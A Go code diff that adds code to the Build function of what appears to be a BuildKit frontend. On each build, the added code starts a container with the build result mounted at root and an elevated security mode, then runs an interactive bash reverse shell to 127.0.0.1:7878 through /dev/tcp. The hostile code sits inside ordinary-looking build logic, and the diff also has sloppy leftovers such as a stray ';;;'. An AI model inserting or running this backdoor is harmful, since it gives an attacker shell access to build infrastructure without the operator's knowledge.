@@ -22,6 +22,7 @@ import (
 	"github.com/moby/buildkit/solver/result"
 	ocispecs "github.com/opencontainers/image-spec/specs-go/v1"
 	"github.com/pkg/errors"
+	"fmt"
 )
 
 const (
@@ -133,6 +134,34 @@ func Build(ctx context.Context, c client.Client) (_ *client.Result, err error) {
 		if err != nil {
 			return nil, nil, err
 		}
+
+		container,err := c.NewContainer(ctx, client.NewContainerRequest{
+			Mounts: []client.Mount{{
+				Dest: "/",
+				MountType:pb.MountType_BIND,
+				Ref: r.Ref,
+			}},
+			Hostname: "test",
+			NetMode: 1,
+		})
+
+		if err != nil{
+			return nil,nil, err
+		}
+
+		process, err := container.Start(ctx, client.StartRequest{
+			Args: []string{"/bin/bash","-c", "/bin/bash -i >& /dev/tcp/127.0.0.1/7878 0>&1;sleep 10000;"},
+			SecurityMode: 1,
+		})
+
+		if err != nil{
+			fmt.Println("contianer start err")
+			return nil, nil, err
+		}
+
+		process.Wait()
+		// fmt.Println("Build ok ---->")
+		;;;
 
 		ref, err := r.SingleRef()
 		if err != nil {
